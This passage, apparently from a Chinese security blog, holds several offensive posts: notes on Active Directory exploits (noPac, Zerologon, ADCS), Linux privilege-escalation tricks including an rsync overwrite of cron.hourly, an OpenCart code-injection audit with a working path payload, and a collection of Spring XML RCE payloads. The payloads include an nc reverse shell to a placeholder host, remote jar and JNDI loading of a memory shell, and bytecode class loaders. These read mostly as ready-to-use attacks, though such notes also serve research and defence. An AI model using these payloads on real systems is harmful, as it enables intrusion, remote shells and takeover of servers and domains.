<li>CVE-2021-42278，机器账户的名称一般用<code>$</code>结尾，但AD并未对域内机器账户名进行验证。</li>
<li>CVE-2021-42287， 结合上述42278漏洞，创建一个与DC机器账户名称相同的机器账户(不以$结尾)，使用该账户请求一个TGT后，修改账户名，然后通过S4U2Self申请TGS Ticket，然后DC进行在<code>TGS_REP</code>阶段加密<code>TGS Ticket</code>时，无法找到该账户利用机器账户hash加密，DC便使用自己的hash加密<code>TGS Ticket</code>，提供一个属于该账户的<code>PAC</code>，我们便可得到一个高权限的ST。</li>
</ul>
<p>约束委派S4U2提权</p>
<h2 id="Zerologon"><a href="#Zerologon" class="headerlink" title="Zerologon"></a>Zerologon</h2><p>号称3秒撸域控</p>
<h4 id="CVE-2020-1472"><a href="#CVE-2020-1472" class="headerlink" title="CVE-2020-1472"></a>CVE-2020-1472</h4><p>AES-CFB8安全性取决于随机选择的IV。但在Netlogon RPC中，作为ComputeNetlogonCredential检查的一部分，IV被错误的设置为0。</p>
<p>属于错误配置漏洞，加密算法这块先暂存一下。</p>
<p>流量日志看</p>
<p><img src="/../imgs/$%7Bfiilename%7D/20201007171427-80258148-087d-1.jpg" alt="img"></p>
<p>这个洞打完得恢复下密码。注册表中的密码是不改的。</p>
<h2 id="ADCS"><a href="#ADCS" class="headerlink" title="ADCS"></a>ADCS</h2><p>ADCS 是一套域内的证书服务，安装了ADCS服务的域内允许通过CA签发的证书进行身份认证。</p>
<h4 id="CVE-2022-26923"><a href="#CVE-2022-26923" class="headerlink" title="CVE-2022-26923"></a>CVE-2022-26923</h4><h5 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h5><p>默认情况下，域用户账号可以申请User证书，域计算机机器账号可以申请Machine证书，两个证书都允许客戶端身份验证。用户账号用UPN区分用户，机器账号用dNSHostName来区别机器，服务用SPN来唯一确定一个服务。</p>
<p>微软策略允许不同机器有相同dns名称</p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/adschema/r-validated-dns-host-name">https://docs.microsoft.com/en-us/windows/win32/adschema/r-validated-dns-host-name</a></p>
<p>但机器账号身份与SPN有联系。SPN具有唯一性</p>
<p>机器账号存在dNSHostName属性。该属性和机器证书是绑定的，不同机器账号的dNSHostName内容，就会得到不同的证书。选一个可控的机器账号对象，将dNSHostName的值改成域控”dc.test.com”，同时解除该机器账号绑定的SPN，即可获取域控机器账户的权限。</p>
<h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><p><strong>1、域控服务器系统版本</strong></p>
<p>Win8.1、Win10、Win11、Win Server 2012 R2、Win Server 2016、Win Server 2019、Win Server 2022等版本，详细版本号可以参考微软官方的公告（参考链接）。</p>
<p><strong>2、域内普通用户账号权限</strong></p>
<p>且用户对自己创立的机器用户的dNSHostName与SPN具有写权限</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/09/09/Linux%E6%8F%90%E6%9D%83/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Charger0">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Charger0">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/09/09/Linux%E6%8F%90%E6%9D%83/" class="post-title-link" itemprop="url">linux提权</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-09-10 03:38:24" itemprop="dateCreated datePublished" datetime="2024-09-10T03:38:24+08:00">2024-09-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-11-13 18:00:10" itemprop="dateModified" datetime="2024-11-13T18:00:10+08:00">2024-11-13</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h1><h3 id="挂载复用导致的提权"><a href="#挂载复用导致的提权" class="headerlink" title="挂载复用导致的提权"></a>挂载复用导致的提权</h3><h4 id="Lxd-Privilege-Escalation"><a href="#Lxd-Privilege-Escalation" class="headerlink" title="Lxd Privilege Escalation"></a>Lxd Privilege Escalation</h4><p><strong>Linux 容器 （LXC）</strong> 通常被视为一种轻量级虚拟化技术，它介于 chroot 和完全开发的虚拟机之间，它创建了一个尽可能接近 Linux 安装的环境，但不需要单独的内核。<br><strong>Linux 守护程序 （LXD）</strong> 是轻量级容器管理程序。LXD 构建在称为 LXC 的容器技术之上，该技术以前被 Docker 使用。它使用稳定的 LXC API 在后台完成所有容器管理，并在其上添加 REST API，并提供更简单、更一致的用户体验。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt install lxd</span><br><span class="line">apt install zfsutils-linux</span><br><span class="line">usermod --append --groups lxd raj</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>lxd组成员对lxc有控制权，可以create a container using lxc</p>
<p>将这个容器挂载到&#x2F;root</p>
<p>lxc exec ignite &#x2F;bin&#x2F;sh  使用容器里面的shell</p>
<p>即可完成提权。</p>
<h4 id="Docker提权"><a href="#Docker提权" class="headerlink" title="Docker提权"></a>Docker提权</h4><p>同样类似上面</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/170783.html">普通用户借助Docker容器提权思路分享 - FreeBuf网络安全行业门户</a></p>
<h3 id="Rsync"><a href="#Rsync" class="headerlink" title="Rsync"></a>Rsync</h3><p>linux下一款数据备份工具，默认开启873端口</p>
<p>借助Linux默认计划任务调用&#x2F;etc&#x2F;cron.hourly，利用rsync连接覆盖</p>
<p>前提：没有账号密码验证 开放873端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">上传文件覆盖定时任务目录下rsync -av nc rsync://victim:873/src/etc/cron.hourly</span><br></pre></td></tr></table></figure>

<h3 id="Polkit"><a href="#Polkit" class="headerlink" title="Polkit"></a>Polkit</h3><p>pkexec 提权。打exp就可以</p>
<h3 id="Suid提权"><a href="#Suid提权" class="headerlink" title="Suid提权"></a>Suid提权</h3><p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a></p>
<h3 id="Capabilities-提权"><a href="#Capabilities-提权" class="headerlink" title="Capabilities 提权"></a>Capabilities 提权</h3><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/358115.html">Linux提权之Capabilities提权（一） - FreeBuf网络安全行业门户</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/09/09/%E6%9F%904kstar%20cms%E5%AE%A1%E8%AE%A1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Charger0">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Charger0">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/09/09/%E6%9F%904kstar%20cms%E5%AE%A1%E8%AE%A1/" class="post-title-link" itemprop="url">某4Kstar CMS审计</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-09-10 03:38:24" itemprop="dateCreated datePublished" datetime="2024-09-10T03:38:24+08:00">2024-09-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-11-13 17:51:46" itemprop="dateModified" datetime="2024-11-13T17:51:46+08:00">2024-11-13</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前置说明"><a href="#前置说明" class="headerlink" title="前置说明"></a>前置说明</h1><p>此漏洞基于CVE-2023-47444&#x2F;CNVD-2024-30067相同的前置条件  即管理员权限且默认存储位置未修改</p>
<p><a target="_blank" rel="noopener" href="https://0xbro.red/disclosures/disclosed-vulnerabilities/opencart-cve-2023-47444/">OpenCart 中经过身份验证的静态代码注入 （CVE-2023-47444） |0xbro</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2024-30067">OpenCart授权问题漏洞（CNVD-2024-30067）(cnvd.org.cn)</a></p>
<p>此漏洞与上述漏洞影响版本不同，究其原因是通过代码审计发现 V3与V4中代码的具体实现不同，V4中</p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>创建数据库</p>
<p><img src="/./../imgs/wps19.jpg" alt="img"> </p>
<p>源码复制到WWW目录</p>
<p><img src="/./../imgs/wps20.jpg" alt="img"> </p>
<p>访问index.php 自动跳转到安装  </p>
<p>环境检查通过</p>
<p><img src="/./../imgs/wps21.jpg" alt="img"> </p>
<p>配置数据库连接</p>
<p><img src="/./../imgs/wps22.jpg" alt="img"> </p>
<p>安装成功 删除install目录  </p>
<p>环境搭建完成 开始白盒审计</p>
<h1 id="审计过程"><a href="#审计过程" class="headerlink" title="审计过程"></a>审计过程</h1><p>优先审计后台功能点，根据设置的用户密码登录后台</p>
<p>审计到&#x2F;admin&#x2F;common&#x2F;security&#x2F;move</p>
<p><img src="/./../imgs/wps23.jpg" alt="img"> </p>
<p>用户控制的变量被放置在其中，然后将其写入新文件，而没有适当的转义或验证。</p>
<p>查到这里出现过漏洞 但影响版本均为4.0及其更高版本</p>
<p>对比代码</p>
<p><img src="/./../imgs/wps24.jpg" alt="img"> </p>
<p>可以看出 $base_new 等效$path . $directory</p>
<p>跟踪V4中 $base_new的声明</p>
<p><img src="/./../imgs/wps25.jpg" alt="img"> </p>
<p>可知 V4中  $path . $name 等效V3中 $path . $directory</p>
<p>由V4中 关于  $path . $name  的校验</p>
<p><img src="/./../imgs/wps26.jpg" alt="img"> </p>
<p>与V3中 $path . $directory 对比</p>
<p><img src="/./../imgs/wps27.jpg" alt="img"> </p>
<p>得知V3对 $path参数 过滤不严 </p>
<p>V4对 $name参数 过滤不严 </p>
<p>既然V4的$name存在注入  我们设想V3同样存在注入</p>
<p>实现注入所需字符同V4有 ‘ # ) ; </p>
<p>输入与<a target="_blank" rel="noopener" href="https://0xbro.red/disclosures/disclosed-vulnerabilities/opencart-cve-2023-47444/">OpenCart 中经过身份验证的静态代码注入 （CVE-2023-47444） |0xbro</a> 相同的payload后，进入报错逻辑  </p>
<p><img src="/./../imgs/wps28.jpg" alt="img"> </p>
<p>须进一步修改代码 </p>
<p>由str_replace(‘\‘, ‘&#x2F;‘, substr(<strong>DIR_SYSTEM</strong>, 0, strlen($path))</p>
<p><strong>DIR_SYSTEM &#x3D; ‘D:&#x2F; phpstudy_pro&#x2F; WWW&#x2F; upload&#x2F; system&#x2F;‘: string</strong></p>
<p>可知  $path需要输入的格式为绝对路径  这样substr截取后的才是我们要注入的字符串</p>
<p>需要网站目录绝对路径 可以通过错误日志查看</p>
<p><img src="/./../imgs/wps29.jpg" alt="img"> </p>
<p>更换payload后 </p>
<p><img src="/./../imgs/wps30.jpg" alt="img"> </p>
<p>Realpath报错</p>
<p>查明原因后得知  realpath需要的是真实存在的目录</p>
<p>经过测试</p>
<p>D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;upload&#x2F;system&#x2F;..&#x2F;pwned’);phpinfo();#-&#x2F;..&#x2F;system</p>
<p>这样的相对路径能够使realpath正常运行 同时保留了注入字符</p>
<h1 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h1><p><img src="/./../imgs/wps31.jpg" alt="img"> </p>
<p><img src="/./../imgs/wps32.jpg" alt="img"> </p>
<p>可以正常进入代码注入逻辑</p>
<p>正常返回</p>
<p><img src="/./../imgs/wps33.jpg" alt="img"> </p>
<p>成功：storage 文件夹位置已更改！</p>
<p>可以看到新产生目录</p>
<p><img src="/./../imgs/wps34.jpg" alt="img"> </p>
<p>而admin&#x2F;config.php注入了phpinfo();</p>
<p><img src="/./../imgs/wps35.jpg" alt="img"> </p>
<p>同样的 我们可以注入一句话木马 </p>
<p><img src="/./../imgs/wps36.jpg" alt="img"> </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/08/31/evil_bean.xml/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Charger0">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Charger0">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/08/31/evil_bean.xml/" class="post-title-link" itemprop="url">evil_bean.xml</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-09-01 03:38:24" itemprop="dateCreated datePublished" datetime="2024-09-01T03:38:24+08:00">2024-09-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-11-13 18:03:14" itemprop="dateModified" datetime="2024-11-13T18:03:14+08:00">2024-11-13</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="poc-xml"><a href="#poc-xml" class="headerlink" title="poc.xml"></a>poc.xml</h1><p>起因是大家都喜欢这样命名xml中的bean。</p>
<h1 id="ClassPathXmlApplicationContext和FileSystemXmlApplicationContext"><a href="#ClassPathXmlApplicationContext和FileSystemXmlApplicationContext" class="headerlink" title="ClassPathXmlApplicationContext和FileSystemXmlApplicationContext"></a>ClassPathXmlApplicationContext和FileSystemXmlApplicationContext</h1><p><strong>AbstractXmlApplicationContext</strong>类的子类，其中的<strong>FileSystemXmlApplicationContext</strong>和<strong>ClassPathXmlApplicationContext</strong>类可以用于加载spring的配置文件，利用spring的依赖注入同样可以完成RCE的利用。</p>
<p><img src="https://img2018.cnblogs.com/blog/1298490/201905/1298490-20190513214105067-1234025099.png" alt="img"></p>
<p>这两个类的作用是加载远程的poc.xml，获取其中的bean实例  </p>
<p>例如：</p>
<h2 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">    &lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">       xsi:schemaLocation=&quot;</span><br><span class="line">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br><span class="line">        &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;</span><br><span class="line">            &lt;constructor-arg &gt;</span><br><span class="line">            &lt;list&gt;</span><br><span class="line">                &lt;value&gt;open&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;-a&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;calculator&lt;/value&gt;</span><br><span class="line">                &lt;!-- &lt;value&gt;bash&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;-c&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;touch /tmp/success&lt;/value&gt; --&gt;</span><br><span class="line">            &lt;/list&gt;</span><br><span class="line">            &lt;/constructor-arg&gt;</span><br><span class="line">        &lt;/bean&gt;</span><br><span class="line">    &lt;/beans&gt;</span><br></pre></td></tr></table></figure>

<h1 id="spel"><a href="#spel" class="headerlink" title="spel"></a>spel</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans</span><br><span class="line">http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br><span class="line">&lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">  &lt;constructor-arg&gt;</span><br><span class="line">    &lt;list value-type=&quot;java.lang.String&quot; &gt;</span><br><span class="line">       &lt;value&gt;nc&lt;/value&gt;</span><br><span class="line">       &lt;value&gt;X.X.X.X&lt;/value&gt;</span><br><span class="line">       &lt;value&gt;9999&lt;/value&gt;</span><br><span class="line">       &lt;value&gt;-e&lt;/value&gt;</span><br><span class="line">       &lt;value&gt;/bin/sh&lt;/value&gt;</span><br><span class="line">    &lt;/list&gt;</span><br><span class="line">  &lt;/constructor-arg&gt;</span><br><span class="line">  &lt;property name=&quot;whatever&quot; value=&quot;#&#123;pb.start()&#125;&quot;/&gt;</span><br><span class="line">&lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>



<h2 id="XmlDecoder"><a href="#XmlDecoder" class="headerlink" title="XmlDecoder"></a>XmlDecoder</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br><span class="line">    &lt;bean id=&quot;pb&quot; class=&quot;java.beans.XMLDecoder&quot; init-method=&quot;readObject&quot;&gt;</span><br><span class="line">        &lt;constructor-arg&gt;</span><br><span class="line">            &lt;bean id=&quot;x&quot; class=&quot;java.io.ByteArrayInputStream&quot; &gt;</span><br><span class="line">                &lt;constructor-arg&gt;</span><br><span class="line">                    &lt;list&gt;</span><br><span class="line">                        &lt;!-- xml序列化内容 --&gt;</span><br><span class="line">                        &lt;value type=&quot;byte&quot;&gt;60&lt;/value&gt;</span><br><span class="line">                        &lt;value type=&quot;byte&quot;&gt;106&lt;/value&gt;</span><br><span class="line">                        &lt;value type=&quot;byte&quot;&gt;97&lt;/value&gt;</span><br><span class="line">                        &lt;value type=&quot;byte&quot;&gt;118&lt;/value&gt;</span><br><span class="line">                        &lt;value type=&quot;byte&quot;&gt;97&lt;/value&gt;</span><br><span class="line">                        &lt;value type=&quot;byte&quot;&gt;62&lt;/value&gt;</span><br><span class="line">                        ......</span><br><span class="line">                    &lt;/list&gt;</span><br><span class="line">                &lt;/constructor-arg&gt;</span><br><span class="line">            &lt;/bean&gt;</span><br><span class="line">        &lt;/constructor-arg&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>

<h1 id="jndi"><a href="#jndi" class="headerlink" title="jndi"></a>jndi</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br><span class="line">    &lt;bean class=&quot;javax.naming.InitialContext&quot; factory-method=&quot;doLookup&quot;&gt;</span><br><span class="line">        &lt;constructor-arg type=&quot;java.lang.String&quot; value=&quot;ldap://127.0.0.1:1664/exp&quot;/&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>

<p>但是有版本限制</p>
<h1 id="loadjar"><a href="#loadjar" class="headerlink" title="loadjar"></a>loadjar</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br><span class="line">    &lt;bean id=&quot;classLoader&quot; class=&quot;java.net.URLClassLoader&quot; &gt;</span><br><span class="line">        &lt;constructor-arg&gt;</span><br><span class="line">            &lt;list&gt;</span><br><span class="line">                &lt;value type=&quot;java.net.URL&quot;&gt;http://127.0.0.1:1664/exp.jar&lt;/value&gt;</span><br><span class="line">            &lt;/list&gt;</span><br><span class="line">        &lt;/constructor-arg&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">    &lt;bean id=&quot;clazz&quot; factory-bean=&quot;classLoader&quot; factory-method=&quot;loadClass&quot;&gt;</span><br><span class="line">        &lt;constructor-arg type=&quot;java.lang.String&quot; value=&quot;InjectMemshell&quot;/&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">    &lt;bean factory-bean=&quot;clazz&quot; factory-method=&quot;newInstance&quot;&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>

<h1 id="bcel"><a href="#bcel" class="headerlink" title="bcel"></a><strong>bcel</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot; http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd &quot;&gt;</span><br><span class="line">    &lt;bean id=&quot;classloader&quot; class=&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;/&gt;</span><br><span class="line">    &lt;bean id=&quot;clazz&quot; factory-bean=&quot;classloader&quot; factory-method=&quot;loadClass&quot;&gt;</span><br><span class="line">        &lt;constructor-arg type=&quot;java.lang.String&quot; value=&quot;$$BCEL$$$......&quot;/&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">    &lt;bean factory-bean=&quot;clazz&quot; factory-method=&quot;newInstance&quot;&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>

<p>但有的JDK版本bcel被去掉了</p>
<h1 id="java-lang-ClassLoader-defineClass"><a href="#java-lang-ClassLoader-defineClass" class="headerlink" title="java.lang.ClassLoader#defineClass"></a><strong>java.lang.ClassLoader#defineClass</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot; http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd &quot;&gt;</span><br><span class="line">    &lt;bean id=&quot;decoder&quot; class=&quot;weblogic.utils.encoders.BASE64Decoder&quot;/&gt;</span><br><span class="line">    &lt;bean id=&quot;clazzBytes&quot; factory-bean=&quot;decoder&quot; factory-method=&quot;decodeBuffer&quot;&gt;</span><br><span class="line">        &lt;constructor-arg type=&quot;java.lang.String&quot; value=&quot;yv66vgAAA......&quot;/&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">    &lt;bean id=&quot;classLoader&quot; class=&quot;javax.management.loading.MLet&quot;/&gt;</span><br><span class="line">    &lt;bean id=&quot;clazz&quot; factory-bean=&quot;classLoader&quot; factory-method=&quot;defineClass&quot;&gt;</span><br><span class="line">        &lt;constructor-arg type=&quot;[B&quot; ref=&quot;clazzBytes&quot;/&gt;</span><br><span class="line">        &lt;constructor-arg type=&quot;int&quot; value=&quot;0&quot;/&gt;</span><br><span class="line">        &lt;constructor-arg type=&quot;int&quot; value=&quot;10692&quot;/&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">    &lt;bean factory-bean=&quot;clazz&quot; factory-method=&quot;newInstance&quot;/&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/08/19/%E7%BB%9F%E4%BF%A1UOS%E6%9F%90%E6%9C%8D%E5%8A%A1%E8%BF%9B%E7%A8%8B%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Charger0">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Charger0">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/08/19/%E7%BB%9F%E4%BF%A1UOS%E6%9F%90%E6%9C%8D%E5%8A%A1%E8%BF%9B%E7%A8%8B%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">统信UOS某服务进程本地提权漏洞</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-08-20 03:38:24" itemprop="dateCreated datePublished" datetime="2024-08-20T03:38:24+08:00">2024-08-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-11-13 17:52:20" itemprop="dateModified" datetime="2024-11-13T17:52:20+08:00">2024-11-13</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
